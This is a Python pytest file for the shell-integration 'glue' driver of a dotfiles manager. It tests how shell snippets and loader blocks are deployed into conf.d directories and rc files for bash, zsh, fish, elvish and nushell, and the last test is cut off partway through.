'''Glue driver (`via: glue`) — the shell-integration half split out of the dotfiles driver.

Mirrors the glue/loader coverage that used to live under the dotfiles driver: snippet deploy to the
store conf.d mirror, per-shell loaders, the `loader: all` shell-glue substrate, and get_version.'''

import pytest
import os

from configsys.componentObj import ResolvedComponent
from configsys.drivers import get_driver
from configsys.drivers.glue import Glue
from configsys.paths import Paths
from configsys.runner import Runner


def paths_for(tmp_path, shells='bash'):
    return Paths(env={'CONFIGSYS_HOME': str(tmp_path / 'home'),
                      'CONFIGSYS_REPO': str(tmp_path / 'repo'),
                      'CONFIGSYS_GLUE_SHELLS': shells})


def _glue_unit(comp='btop-glue', glue='btop'):
    return ResolvedComponent(key=f'glue\\{comp}', driver='glue', comp=comp, fields={'glue': glue})


def _loader_unit(loader='all'):
    return ResolvedComponent(key='glue\\shell-glue', driver='glue', comp='shell-glue',
                             fields={'loader': loader})


def test_glue_registered_under_via_glue(tmp_path):
    drv = get_driver('glue', Runner(pretend=True), paths_for(tmp_path))
    assert isinstance(drv, Glue)


@pytest.mark.real_runner
def test_snippet_materializes_to_store_confd_mirror_executable(tmp_path):
    # a glue snippet deploys to <store>/<shell>/conf.d/50-<name>.<ext> (the store mirrors the deployed
    # ~/.config/<shell>/conf.d/ layout), made a+x; the link points at the store copy, never the repo.
    p = paths_for(tmp_path)
    (p.glue_dir / 'shell' / 'bash').mkdir(parents=True)
    (p.glue_dir / 'shell' / 'bash' / 'btop.sh').write_text('# btop glue\n')   # repo-authored, -x
    p.home.mkdir(parents=True)
    g = Glue(Runner(pretend=False), paths=p)
    rc = _glue_unit()
    assert g.get_version(rc) is None
    assert g.install(rc).ok
    link = p.home / '.config' / 'bash' / 'conf.d' / '50-btop.sh'
    store = p.user_glue_dir / 'bash' / 'conf.d' / '50-btop.sh'
    assert link.is_symlink() and os.path.realpath(link) == os.path.realpath(store)
    assert store.read_text() == '# btop glue\n'
    assert os.access(store, os.X_OK)                                  # executable
    assert os.path.realpath(link) != os.path.realpath(p.glue_dir / 'shell' / 'bash' / 'btop.sh')
    assert g.get_version(rc) == 'linked'
    # uninstall removes only our symlink
    assert g.uninstall(rc).ok
    assert not link.exists()
    assert g.get_version(rc) is None


@pytest.mark.real_runner
def test_activate_refreshes_a_stale_store_copy_from_source(tmp_path):
    # the store is a deploy CACHE — when the authoritative source changes, a re-activate must
    # re-materialize over the stale cached copy (glue is shipped content).
    p = paths_for(tmp_path)
    (p.glue_dir / 'shell' / 'bash').mkdir(parents=True)
    auth = p.glue_dir / 'shell' / 'bash' / 'btop.sh'
    auth.write_text('# v1\n')
    p.home.mkdir(parents=True)
    g = Glue(Runner(pretend=False), paths=p)
    rc = _glue_unit()
    assert g.install(rc).ok
    store = p.user_glue_dir / 'bash' / 'conf.d' / '50-btop.sh'
    assert store.read_text() == '# v1\n'
    auth.write_text('# v2 updated\n')                    # source changes upstream
    res = g.install(rc)
    assert res.ok and store.read_text() == '# v2 updated\n'   # stale cache refreshed
    assert 'refreshed from source' in res.output


@pytest.mark.real_runner
def test_activate_ensures_the_shell_loader(tmp_path):
    # a direct activate bypasses the snippet's `requires: shell-glue`, so the snippet driver wires
    # the shell loader itself — else the linked conf.d file would never be sourced.
    p = paths_for(tmp_path, shells='zsh')
    (p.glue_dir / 'shell' / 'zsh').mkdir(parents=True)
    (p.glue_dir / 'shell' / 'zsh' / 'btop.zsh').write_text('# glue\n')
    p.home.mkdir(parents=True)
    g = Glue(Runner(pretend=False), paths=p)
    assert g.install(_glue_unit()).ok
    assert '# >>> configsys glue >>>' in (p.home / '.zshrc').read_text()   # zsh loader wired


def test_zsh_loader_adds_idempotent_rc_block_and_uninstall_removes_it(tmp_path):
    p = paths_for(tmp_path, shells='zsh')
    p.home.mkdir(parents=True)
    (p.home / '.zshrc').write_text('# my zshrc\nexport FOO=1\n')      # a pre-existing rc
    g = Glue(Runner(pretend=False), paths=p)
    rc = ResolvedComponent(key='glue\\zsh-glue', driver='glue', comp='zsh-glue',
                           fields={'loader': 'zsh'})
    assert g.get_version(rc) is None
    assert g.install(rc).ok
    confd = p.home / '.config' / 'zsh' / 'conf.d'
    zshrc = (p.home / '.zshrc').read_text()
    assert confd.is_dir()
    assert '# >>> configsys glue >>>' in zshrc
    assert 'my zshrc' in zshrc and 'export FOO=1' in zshrc            # user content preserved
    assert g.get_version(rc) == 'linked'
    g.install(rc)                                                     # idempotent — no second block
    assert (p.home / '.zshrc').read_text().count('# >>> configsys glue >>>') == 1
    g.uninstall(rc)
    after = (p.home / '.zshrc').read_text()
    assert '# >>> configsys glue >>>' not in after
    assert 'export FOO=1' in after                                   # user content still intact
    assert confd.is_dir()                                            # dir left alone
    assert g.get_version(rc) is None


@pytest.mark.real_runner
def test_elvish_gestalt_loader_inlines_snippets_into_rc(tmp_path):
    # elvish's per-file `eval` isolates namespaces, so shell-glue uses the GESTALT loader: the rc.elv
    # marker block INLINES the concatenated conf.d snippet contents (so `fn`/`var` land in the
    # interactive namespace), regenerated on (de)activation. Snippets still deploy to conf.d as links.
    p = paths_for(tmp_path, shells='elvish')
    (p.glue_dir / 'shell' / 'elvish').mkdir(parents=True)
    (p.glue_dir / 'shell' / 'elvish' / '00-configsys.elv').write_text('fn cf {|@a| put configsys }\n')
    (p.glue_dir / 'shell' / 'elvish' / 'bat.elv').write_text('fn bat {|@a| batcat $@a }\n')
    p.home.mkdir(parents=True)
    g = Glue(Runner(pretend=False), paths=p)
    rc_elv = p.home / '.config' / 'elvish' / 'rc.elv'

    # activate the substrate snippet first, then bat -> the rc block inlines BOTH, in sorted order
    assert g.install(_glue_unit(comp='configsys-glue', glue='00-configsys')).ok
    assert g.install(_glue_unit(comp='bat-glue', glue='bat')).ok
    block = rc_elv.read_text()
    assert '# >>> configsys glue >>>' in block
    assert 'fn cf {|@a| put configsys }' in block                    # inlined, not sourced
    assert 'fn bat {|@a| batcat $@a }' in block
    assert '[nomatch-ok]' not in block and 'eval (slurp' not in block  # NOT the old source-loop
    assert block.index('# >> 00-configsys.elv') < block.index('# >> 50-bat.elv')   # 00- first
    # links still deploy to conf.d
    link = p.home / '.config' / 'elvish' / 'conf.d' / '50-bat.elv'
    assert link.is_symlink()

    # deactivating bat regenerates the block WITHOUT bat, keeps the substrate
    assert g.uninstall(_glue_unit(comp='bat-glue', glue='bat')).ok
    block2 = rc_elv.read_text()
    assert 'fn bat {|@a| batcat $@a }' not in block2 and 'fn cf {|@a| put configsys }' in block2

    # the loader-all substrate removal drops the whole block
    loader = _loader_unit('all')
    assert g.get_version(loader) == 'linked'
    assert g.uninstall(loader).ok
    assert '# >>> configsys glue >>>' not in rc_elv.read_text()
    assert g.get_version(loader) is None


@pytest.mark.real_runner
def test_spec_states_flags_a_changed_source_as_drifted(tmp_path):
    # after a snippet is active, editing the SHIPPED source marks it 'drifted' (active but stale) — so
    # the Glue TUI shows it changed and the user knows to re-activate (the store copy holds the OLD
    # content until then). Re-activating refreshes the store -> back to 'linked'.
    p = paths_for(tmp_path)
    (p.glue_dir / 'shell' / 'bash').mkdir(parents=True)
    auth = p.glue_dir / 'shell' / 'bash' / 'btop.sh'
    auth.write_text('# v1\n')
    p.home.mkdir(parents=True)
    g = Glue(Runner(pretend=False), paths=p)
    rc = _glue_unit()
    assert g.install(rc).ok
    assert [s[2] for s in g.spec_states(rc)] == ['linked']       # active + fresh
    auth.write_text('# v2 changed\n')                            # shipped source changes upstream
    assert [s[2] for s in g.spec_states(rc)] == ['drifted']      # store copy now stale -> flagged
    assert g.install(rc).ok                                      # re-activate re-materializes the store
    assert [s[2] for s in g.spec_states(rc)] == ['linked']       # fresh again


def test_installed_shells_counts_managed_tarball_shell_off_path(tmp_path):
    # a shell configsys MANAGES (binary in its install dir, per the glue-locations cache) is detected
    # even when it's not on the current PATH — so a tarball shell shows in the Glue TUI immediately,
    # without opening a fresh shell to get it on PATH first.
    p = Paths(env={'CONFIGSYS_HOME': str(tmp_path / 'home'), 'CONFIGSYS_REPO': str(tmp_path / 'repo'),
                   'PATH': str(tmp_path / 'no-such-bin')})     # nothing on PATH; NO GLUE_SHELLS override
    # a managed nushell tarball: <dir>/nu-<ver>-.../nu (versioned subdir), executable
    nudir = tmp_path / 'apps' / 'nushell'
    nubin = nudir / 'nu-0.115.1-x86_64-unknown-linux-gnu' / 'nu'
    nubin.parent.mkdir(parents=True)
    nubin.write_text('#!/bin/sh\n')
    os.chmod(nubin, 0o755)
    p.glue_locations_file.parent.mkdir(parents=True, exist_ok=True)
    p.glue_locations_file.write_text(f'nushell\t{nudir}\nelvish\t{tmp_path}/absent\n', encoding='utf-8')

    shells = Glue(Runner(pretend=True), paths=p)._installed_shells()
    assert 'nu' in shells                    # managed tarball with the binary present -> detected off PATH
    assert 'elvish' not in shells            # cache lists it but its dir/binary is absent -> not detected


@pytest.mark.real_runner
def test_nushell_gestalt_loader_inlines_snippets_into_config(tmp_path):
    # nushell can't dynamically source a dir (it parses the whole program first, so `source` needs a
    # parse-time-constant path — no conf.d loop possible), so like elvish it uses the GESTALT loader:
    # config.nu's marker block INLINES the concatenated conf.d snippets, regenerated on (de)activation.
    p = paths_for(tmp_path, shells='nu')
    (p.glue_dir / 'shell' / 'nu').mkdir(parents=True)
    (p.glue_dir / 'shell' / 'nu' / '00-configsys.nu').write_text('def cf [...a] { configsys ...$a }\n')
    (p.glue_dir / 'shell' / 'nu' / 'fd.nu').write_text('def --wrapped fd [...r] { ^fdfind ...$r }\n')
    p.home.mkdir(parents=True)
    g = Glue(Runner(pretend=False), paths=p)
    config_nu = p.home / '.config' / 'nushell' / 'config.nu'

    # activate the substrate first, then fd -> the block inlines BOTH, in sorted order
    assert g.install(_glue_unit(comp='configsys-glue', glue='00-configsys')).ok
    assert g.install(_glue_unit(comp='fd-glue', glue='fd')).ok
    block = config_nu.read_text()
    assert '# >>> configsys glue >>>' in block
    assert 'def cf [...a] { configsys ...$a }' in block               # inlined, not sourced
    assert 'def --wrapped fd [...r] { ^fdfind ...$r }' in block
    assert 'source ' not in block                                    # nu can't source-loop a dir
    assert block.index('# >> 00-configsys.nu') < block.index('# >> 50-fd.nu')   # 00- first
    link = p.home / '.config' / 'nushell' / 'conf.d' / '50-fd.nu'
    assert link.is_symlink()

    # deactivating fd regenerates the block WITHOUT fd, keeps the substrate
    assert g.uninstall(_glue_unit(comp='fd-glue', glue='fd')).ok
    block2 = config_nu.read_text()
    assert 'fd [...r]' not in block2 and 'def cf [...a]' in block2

    # removing the loader-all substrate drops the whole block
    loader = _loader_unit('all')
    assert g.get_version(loader) == 'linked'
    assert g.uninstall(loader).ok
    assert '# >>> configsys glue >>>' not in config_nu.read_text()
    assert g.get_version(loader) is None


@pytest.mark.real_runner
def test_nushell_gestalt_cs_eval_inlines_generated_output(tmp_path):
    # a `#!cs-eval <cmd>` snippet is a GENERATOR: the inline loader runs the command and inlines its
    # STDOUT (an init-eval tool's shell code), not the directive — the bridge for zoxide/atuin on
    # nushell, which has no runtime eval. A failing command (tool absent/too old) inlines NOTHING and
    # never breaks the block.
    p = paths_for(tmp_path, shells='nu')
    (p.glue_dir / 'shell' / 'nu').mkdir(parents=True)
    (p.glue_dir / 'shell' / 'nu' / 'zoxide.nu').write_text(
        "# zoxide init\n#!cs-eval echo 'def z [] { 42 }'\n")
    (p.glue_dir / 'shell' / 'nu' / 'nope.nu').write_text("# absent tool\n#!cs-eval false\n")
    p.home.mkdir(parents=True)
    g = Glue(Runner(pretend=False), paths=p)
    config_nu = p.home / '.config' / 'nushell' / 'config.nu'

    assert g.install(_glue_unit(comp='zoxide-glue', glue='zoxide')).ok
    assert g.install(_glue_unit(comp='nope-glue', glue='nope')).ok
    block = config_nu.read_text()
    assert 'def z [] { 42 }' in block                     # the command's OUTPUT is inlined
    assert '#!cs-eval' not in block                       # the directive line itself is not inlined
    assert '(generated: echo' in block                    # header notes it was generated (names the cmd)
    assert 'nope.nu' not in block                         # the failing command inlined nothing


def test_shell_glue_loader_all_hooks_every_installed_shell(tmp_path):
    # the shell-glue substrate: `loader: all` wires conf.d loading for EVERY installed shell.
    p = paths_for(tmp_path, shells='bash,zsh,fish')
    p.glue_dir.mkdir(parents=True)
    (p.glue_dir / 'bash_aliases').write_text('# source conf.d\n')   # bash's loader file
    p.home.mkdir(parents=True)
    g = Glue(Runner(pretend=False), paths=p)
    rc = _loader_unit('all')
    assert g.get_version(rc) is None
    assert g.install(rc).ok
    assert (p.home / '.config' / 'bash' / 'conf.d').is_dir()
    assert '# >>> configsys glue >>>' in (p.home / '.bashrc').read_text()   # bash: an rc block (B3)
    assert not (p.home / '.bash_aliases').exists()                   # (no longer the Debian-only hook)
    assert (p.home / '.config' / 'fish' / 'conf.d').is_dir()          # fish auto-sources natively
    assert '# >>> configsys glue >>>' in (p.home / '.zshrc').read_text()   # zsh needs the rc block
    assert '(N)' in (p.home / '.zshrc').read_text() and 'null_glob' not in (p.home / '.zshrc').read_text()
    assert g.get_version(rc) == 'linked'
    g.uninstall(rc)
    assert '# >>> configsys glue >>>' not in (p.home / '.zshrc').read_text()
    assert '# >>> configsys glue >>>' not in (p.home / '.bashrc').read_text()
    assert g.get_version(rc) is None                                 # loaders gone


def test_shell_glue_bash_leaves_your_own_bash_aliases_alone(tmp_path):
    # B3: bash glue is a ~/.bashrc block now; a real ~/.bash_aliases is yours and stays put
    p = paths_for(tmp_path, shells='bash')
    p.home.mkdir(parents=True)
    (p.home / '.bash_aliases').write_text('alias mine="echo hi"\n')
    (p.home / '.bashrc').write_text('# fedora skel\n. ~/.bashrc.d/x 2>/dev/null\n')
    g = Glue(Runner(pretend=False), paths=p)
    rc = _loader_unit('all')
    assert g.install(rc).ok
    assert (p.home / '.bash_aliases').read_text() == 'alias mine="echo hi"\n'
    text = (p.home / '.bashrc').read_text()
    assert text.startswith('# fedora skel') and 'conf.d/*.sh' in text
    g.uninstall(rc)
    assert (p.home / '.bashrc').read_text().rstrip() == '# fedora skel\n. ~/.bashrc.d/x 2>/dev/null'


def test_bash_hookup_retires_our_old_link_and_writes_a_login_profile(tmp_path):
    p = paths_for(tmp_path, shells='bash')
    p.glue_dir.mkdir(parents=True)
    (p.glue_dir / 'bash_aliases').write_text('# legacy loader\n')
    p.home.mkdir(parents=True)
    g = Glue(Runner(pretend=False), paths=p)
    (p.home / '.bash_aliases').symlink_to(p.glue_dir / 'bash_aliases')   # what an older configsys left
    assert (p.home / '.bash_aliases').is_symlink()
    assert g.install(_loader_unit('all')).ok
    assert not (p.home / '.bash_aliases').exists()           # our old link retired
    assert '. ~/.bashrc' in (p.home / '.bash_profile').read_text()   # Void/Alpine: no profile at all
    assert '# >>> configsys glue >>>' in (p.home / '.bashrc').read_text()


def test_a_captured_bashrc_is_never_edited_through_its_link(tmp_path):
    p = paths_for(tmp_path, shells='bash')
    p.home.mkdir(parents=True)
    captured = tmp_path / 'store' / 'bashrc'
    captured.parent.mkdir()
    captured.write_text('# my bashrc\n')
    (p.home / '.bashrc').symlink_to(captured)
    g = Glue(Runner(pretend=False), paths=p)
    g.install(_loader_unit('all'))
    assert captured.read_text() == '# my bashrc\n'          # untouched; the loader reads "off"
    assert not g._loader_ok('bash')


@pytest.mark.real_runner
def test_snippet_activates_only_installed_shells(tmp_path):
    # a snippet deploys to conf.d for each INSTALLED shell that ships a variant (CONFIGSYS_GLUE_SHELLS
    # pins the set); a shell that isn't "installed" gets nothing.
    p = paths_for(tmp_path, shells='bash,fish')
    for sh, ext in (('bash', 'sh'), ('fish', 'fish'), ('zsh', 'zsh')):
        (p.glue_dir / 'shell' / sh).mkdir(parents=True)
        (p.glue_dir / 'shell' / sh / f'btop.{ext}').write_text('# glue\n')
    p.home.mkdir(parents=True)
    g = Glue(Runner(pretend=False), paths=p)
    assert g.install(_glue_unit()).ok
    assert (p.home / '.config' / 'bash' / 'conf.d' / '50-btop.sh').is_symlink()
    assert (p.home / '.config' / 'fish' / 'conf.d' / '50-btop.fish').is_symlink()
    assert not (p.home / '.config' / 'zsh' / 'conf.d' / '50-btop.zsh').exists()   # zsh not installed


@pytest.mark.real_runner
def test_install_only_shells_scopes_activation_to_one_shell(tmp_path):
    # the TUI Glue group action passes only_shells so activating a snippet in ONE shell group doesn't
    # light up the component's other shells (the A-activates-everything bug). Each per-shell row is
    # independently activatable; only_shells=None (the CLI path) still does all shells.
    p = paths_for(tmp_path, shells='bash,zsh,fish')
    for sh, ext in (('bash', 'sh'), ('zsh', 'zsh'), ('fish', 'fish')):
        (p.glue_dir / 'shell' / sh).mkdir(parents=True)
        (p.glue_dir / 'shell' / sh / f'btop.{ext}').write_text('# glue\n')
    p.home.mkdir(parents=True)
    g = Glue(Runner(pretend=False), paths=p)
    rc = _glue_unit()
    bash = p.home / '.config' / 'bash' / 'conf.d' / '50-btop.sh'
    zsh = p.home / '.config' / 'zsh' / 'conf.d' / '50-btop.zsh'
    fish = p.home / '.config' / 'fish' / 'conf.d' / '50-btop.fish'

    g.install(rc, only_shells=['bash'])                      # activate ONLY bash
    assert bash.is_symlink() and not zsh.exists() and not fish.exists()
    g.install(rc, only_shells=['zsh'])                       # add zsh; fish still untouched
    assert bash.is_symlink() and zsh.is_symlink() and not fish.exists()
    g.uninstall(rc, only_shells=['bash'])                    # deactivate ONLY bash
    assert not bash.exists() and zsh.is_symlink()


@pytest.mark.real_runner
def test_confd_symlinked_to_store_makes_no_self_loop(tmp_path):
    # if ~/.config/<shell>/conf.d is itself a symlink to the store's conf.d dir, the store file IS the
    # deployed file — a naive `ln -sfn store/x conf.d/x` would resolve to a self-link (ELOOP). Install
    # must detect the realpath coincidence and skip the link, leaving a real file.
    p = paths_for(tmp_path)
    (p.glue_dir / 'shell' / 'bash').mkdir(parents=True)
    (p.glue_dir / 'shell' / 'bash' / 'btop.sh').write_text('# glue\n')
    store_confd = p.user_glue_dir / 'bash' / 'conf.d'
    store_confd.mkdir(parents=True)
    confd = p.home / '.config' / 'bash' / 'conf.d'
    confd.parent.mkdir(parents=True)
    confd.symlink_to(store_confd)                          # the dir is a symlink to the store
    g = Glue(Runner(pretend=False), paths=p)
    rc = _glue_unit()
    assert g.install(rc).ok
    store_file = store_confd / '50-btop.sh'
    assert store_file.is_file() and not store_file.is_symlink()
    assert g.get_version(rc) == 'linked'
    assert g.install(rc).ok                                # idempotent — no crash, no re-created loop


def test_spec_states_reports_glue_kind(tmp_path):
    p = paths_for(tmp_path)
    (p.glue_dir / 'shell' / 'bash').mkdir(parents=True)
    (p.glue_dir / 'shell' / 'bash' / 'btop.sh').write_text('# btop glue\n')
    p.home.mkdir(parents=True)
    g = Glue(Runner(pretend=False), paths=p)
    rc = _glue_unit()
    states = g.spec_states(rc)
    assert states and all(row[6] == 'glue' for row in states)        # kind column is always 'glue'


# -- B6: safety (pretend no-write, literal rc-block regen, communal conf.d backup) ---------------

def test_pretend_install_touches_no_files(tmp_path):
    # --pretend must not materialize the store, rewrite rc files, or stamp loaders (only the symlink
    # step went through the runner before; the FS ops ran for real).
    p = paths_for(tmp_path)
    (p.glue_dir / 'shell' / 'bash').mkdir(parents=True)
    (p.glue_dir / 'shell' / 'bash' / 'btop.sh').write_text('# btop glue\n')
    drv = Glue(Runner(pretend=True), p)
    drv.install(_glue_unit())
    # nothing was written into the store conf.d mirror
    mirror = list((p.state_dir).rglob('conf.d/*.sh')) if p.state_dir.exists() else []
    assert mirror == []
    assert not (p.home / '.bash_aliases').exists()          # loader link not created under pretend


def test_rc_block_with_backslashes_is_written_literally(tmp_path):
    # regeneration used re.sub with the block as the REPLACEMENT string, so a `\1`/`\t` in an inlined
    # snippet was reinterpreted (mangled) or raised. It must be written byte-for-byte.
    import types
    from configsys.drivers import glue as glue_mod
    from configsys.drivers.glue import _RC_BEGIN, _RC_END
    p = paths_for(tmp_path, shells='nu')                     # an inline (gestalt) shell
    drv = Glue(Runner(pretend=False), p)
    rc_path = drv._expand(glue_mod._SHELL_RC['nu'])          # the rc file the loader actually rewrites
    rc_path.parent.mkdir(parents=True, exist_ok=True)
    rc_path.write_text(f'echo hi\n{_RC_BEGIN}\nold\n{_RC_END}\n')
    tricky = f'{_RC_BEGIN}\nlet x = "a\\1b\tc"\n{_RC_END}\n'
    drv._rc_block = types.MethodType(lambda self, shell: tricky, drv)   # force a backslashy block
    assert drv._ensure_shell_loader('nu') is True
    assert 'a\\1b\tc' in rc_path.read_text()                 # literal, not a backref/tab expansion


def test_install_backs_up_a_real_file_in_a_communal_confd(tmp_path):
    # H1: a conf.d dir can be communal (fish); a pre-existing REAL file at the target is backed up to
    # <name>.pre-configsys, not clobbered — and put back when the glue is deactivated
    p = paths_for(tmp_path, shells='fish')
    (p.glue_dir / 'shell' / 'fish').mkdir(parents=True)
    (p.glue_dir / 'shell' / 'fish' / 'btop.fish').write_text('# btop\n')
    g = Glue(Runner(), p)
    tgt = g._expand(g._specs(_glue_unit())[0][2])
    tgt.parent.mkdir(parents=True, exist_ok=True)
    tgt.write_text('mine\n')
    assert g.install(_glue_unit()).ok
    assert tgt.is_symlink() and tgt.with_name(tgt.name + '.pre-configsys').read_text() == 'mine\n'
    assert g.uninstall(_glue_unit()).ok
    assert not tgt.is_symlink() and tgt.read_text() == 'mine\n'      # restored into the gap


# -- user-glue namespace (user.d/) + 99-user home (docs/done/glue-customization-plan.md P0) --------------

def test_user_glue_scaffolds_home_and_links(tmp_path):
    # On shell hookup the user.d namespace deploys: a blessed 99-user home is scaffolded (dest = local
    # store when no primary), and every user.d snippet links into ~/.config/<shell>/conf.d/, pointing
    # straight at the layer file (edit-in-layer). A user's own snippet added later links on re-hookup.
    from configsys.drivers.glue import _USER_GLUE_HEADER
    p = paths_for(tmp_path, shells='bash')
    p.home.mkdir(parents=True)
    g = Glue(Runner(pretend=False), p)
    assert g.install(_loader_unit('all')).ok                       # hooks bash -> deploys user.d
    home_src = p.user_glue_dir / 'shell' / 'bash' / 'user.d' / '99-user.sh'
    link = p.home / '.config' / 'bash' / 'conf.d' / '99-user.sh'
    assert home_src.is_file() and home_src.read_text() == _USER_GLUE_HEADER
    assert not os.access(home_src, os.X_OK)                        # your file: no chmod (no loader needs +x)
    assert link.is_symlink() and os.path.realpath(link) == os.path.realpath(home_src)
    # a user's OWN snippet dropped in the layer links on the next hookup, pointing at the layer file
    mine = p.user_glue_dir / 'shell' / 'bash' / 'user.d' / 'myalias.sh'
    mine.write_text('alias gs="git status"\n')
    assert g.install(_loader_unit('all')).ok
    mlink = p.home / '.config' / 'bash' / 'conf.d' / '90-myalias.sh'
    assert mlink.is_symlink() and os.path.realpath(mlink) == os.path.realpath(mine)


def test_user_glue_not_resurrected_after_emptied(tmp_path):
    # Scaffold gates on the user.d DIR existing (not a snippet), so a user who deletes 99-user keeps
    # their home empty instead of it reappearing.
    p = paths_for(tmp_path, shells='bash')
    p.home.mkdir(parents=True)
    g = Glue(Runner(pretend=False), p)
    g.install(_loader_unit('all'))
    (p.user_glue_dir / 'shell' / 'bash' / 'user.d' / '99-user.sh').unlink()   # user removes their home
    g.install(_loader_unit('all'))                                            # re-hookup
    assert not (p.user_glue_dir / 'shell' / 'bash' / 'user.d' / '99-user.sh').exists()


def test_user_glue_inlines_into_gestalt_block(tmp_path):
    # A gestalt/inline shell (elvish) has no conf.d sourcing — the rc block INLINES conf.d. The user.d
    # 99-user home, linked into conf.d, therefore appears inside the managed block, so the user's
    # startup runs. (Their free-form space is anything OUTSIDE the block, preserved verbatim.)
    from configsys.drivers.glue import _RC_BEGIN, _RC_END, _SHELL_RC
    p = paths_for(tmp_path, shells='elvish')
    p.home.mkdir(parents=True)
    g = Glue(Runner(pretend=False), p)
    assert g.install(_loader_unit('all')).ok
    rc = g._expand(_SHELL_RC['elvish'])
    body = rc.read_text()
    assert _RC_BEGIN in body and _RC_END in body
    block = body.split(_RC_BEGIN, 1)[1].split(_RC_END, 1)[0]
    assert '99-user.elv' in block and 'configsys links this' in block         # the home is inlined


def test_new_user_snippet_creates_and_deploys(tmp_path):
    # `glue add`'s driver half: create a user.d snippet (trailing ext stripped), deploy links it
    # into conf.d; a second call on the same name is a no-op that preserves content; bad shell -> None.
    p = paths_for(tmp_path, shells='bash')
    p.home.mkdir(parents=True)
    g = Glue(Runner(pretend=False), p)
    path, created = g.new_user_snippet('mytools.sh', 'bash')          # trailing .sh stripped
    assert created and path == p.user_glue_dir / 'shell' / 'bash' / 'user.d' / 'mytools.sh'
    assert not os.access(path, os.X_OK)                               # umask mode, never chmod 755
    g.deploy_user_glue('bash')
    link = p.home / '.config' / 'bash' / 'conf.d' / '90-mytools.sh'
    assert link.is_symlink() and os.path.realpath(link) == os.path.realpath(path)
    path.write_text('alias x=1\n')                                    # user edits it
    path2, created2 = g.new_user_snippet('mytools', 'bash')           # same name -> no-op
    assert path2 == path and created2 is False and path.read_text() == 'alias x=1\n'
    assert g.new_user_snippet('foo', 'tcsh') == (None, False)         # unknown shell


def test_override_forks_shipped_glue_and_reports_drift(tmp_path):
    # `glue override`'s driver half: fork the DEFINING-layer snippet into the user's layer (shadowing
    # the repo by search-path precedence), record the forked-from hash, and later report drift when the
    # shipped source changes. Never clobbers an existing override.
    p = paths_for(tmp_path, shells='bash')
    ship = p.glue_dir / 'shell' / 'bash'                             # the repo/defining layer
    ship.mkdir(parents=True)
    (ship / 'btop.sh').write_text('alias b=btop\n')
    p.home.mkdir(parents=True)
    g = Glue(Runner(pretend=False), p)
    rc = ResolvedComponent(key='glue\\btop-glue', driver='glue', comp='btop-glue',
                           fields={'glue': 'btop'}, source=str(p.glue_dir.parent / 'routes.hu'))
    forked = g.override(rc)
    assert forked == [(p.user_glue_dir / 'shell' / 'bash' / 'btop.sh', 'bash', True)]
    assert g.override(rc)[0][2] is False                             # a re-run: it already exists
    override = forked[0][0]
    assert override.read_text() == 'alias b=btop\n' and not os.access(override, os.X_OK)
    assert g.override_drift(rc) == []                                # source unchanged -> no drift
    # an edit to the override is never clobbered by a re-override
    override.write_text('alias b="btop --tree"\n')
    g.override(rc)
    assert override.read_text() == 'alias b="btop --tree"\n'
    # the SHIPPED source moving on -> drift surfaces
    (ship / 'btop.sh').write_text('alias b=btop  # v2\n')
    drift = g.override_drift(rc)
    assert len(drift) == 1 and drift[0][0] == 'bash' and drift[0][1] != drift[0][2]


def test_no_startup_snippet_spawns_configsys_per_component():
    # ~50 snippets each running `configsys location <x>` (a whole configsys process, ~0.8-1.4s)
    # made bash/zsh startup take ~47s. Snippets use the prelude's cs_loc (the glue-locations cache,
    # read once); only the prelude may call configsys (`location --all`, on a cold/stale cache).
    import re
    from pathlib import Path
    root = Path(__file__).resolve().parent.parent / 'glue' / 'shell'
    bad = [str(p.relative_to(root)) for sh in ('bash', 'zsh') for p in sorted((root / sh).iterdir())
           if not p.name.startswith('00-') and re.search(r'configsys location (?!--all)', p.read_text())]
    assert not bad, f'snippets spawning configsys at startup: {bad}'


def test_cs_loc_reads_the_cache(tmp_path):
    # the bash/zsh prelude's cs_loc answers from glue-locations.tsv, in-shell (zsh too — it doesn't
    # word-split, so the lookup must not rely on that)
    import shutil
    import subprocess
    from pathlib import Path
    root = Path(__file__).resolve().parent.parent / 'glue' / 'shell'
    (tmp_path / 'glue-locations.tsv').write_text('bun\t/opt/bun here\nzig\t/apps/zig\n')
    for sh, f in (('bash', 'bash/00-configsys.sh'), ('zsh', 'zsh/00-configsys.zsh')):
        if not shutil.which(sh):
            continue
        out = subprocess.run([sh, '-c', f'. {root / f}; cs_loc bun; cs_loc zig; cs_loc nope; echo end'],
                             capture_output=True, text=True,
                             env={'HOME': str(tmp_path), 'PATH': '/usr/bin:/bin',
                                  'CONFIGSYS_STATE_DIR': str(tmp_path)}).stdout
        assert out.splitlines() == ['/opt/bun here', '/apps/zig', 'end'], (sh, out)


def test_removing_the_loader_never_edits_a_linked_zshrc(tmp_path):
    # dotfiles-glue-17 (A8): the block in a captured zshrc is part of your portable config
    from configsys.drivers.glue import _RC_BEGIN, _RC_END
    p = Paths(env={'CONFIGSYS_HOME': str(tmp_path / 'home'), 'CONFIGSYS_GLUE_SHELLS': 'zsh'})
    p.home.mkdir(parents=True)
    captured = tmp_path / 'primary' / 'zshrc'
    captured.parent.mkdir()
    text = f'# mine\n{_RC_BEGIN}\nsource things\n{_RC_END}\n'
    captured.write_text(text)
    (p.home / '.zshrc').symlink_to(captured)
    Glue(Runner(pretend=False), paths=p)._remove_shell_loader('zsh')
    assert captured.read_text() == text and (p.home / '.zshrc').is_symlink()


def test_an_unparsable_snippet_is_left_out_of_the_inline_block(tmp_path, monkeypatch):
    # A15 / dotfiles-glue-20: one bad snippet made the whole config.nu unparsable
    import shutil as _sh
    p = paths_for(tmp_path, shells='nu')
    p.home.mkdir(parents=True)
    g = Glue(Runner(pretend=False), paths=p)
    confd = g._ensure_confd('nu')
    (confd / '00-configsys.nu').write_text('let ok = 1\n')
    (confd / '50-bad.nu').write_text('def broken { \n')
    (confd / '50-good.nu').write_text('let fine = 2\n')
    monkeypatch.setattr(_sh, 'which', lambda name: '/usr/bin/' + name)

    import subprocess as _sp

    def fake_run(argv, **kw):
        path = argv[-1].split("nu-check ")[1].split(")")[0].strip("'")
        return _sp.CompletedProcess(argv, 1 if 'def broken {' in open(path).read() else 0)
    monkeypatch.setattr(_sp, 'run', fake_run)
    block = g._inline_block('nu')
    assert 'let ok = 1' in block and 'let fine = 2' in block and 'def broken' not in block
    assert any('50-bad.nu' in w for w in g.inline_warnings)


def test_a_stale_inline_block_reads_loader_off(tmp_path, monkeypatch):
    # A15 / dotfiles-glue-20: a user.d edit / a primary sync never reached the snapshot block, and
    # the Glue screen kept showing it `linked`
    import shutil as _sh
    p = paths_for(tmp_path, shells='nu')
    p.home.mkdir(parents=True)
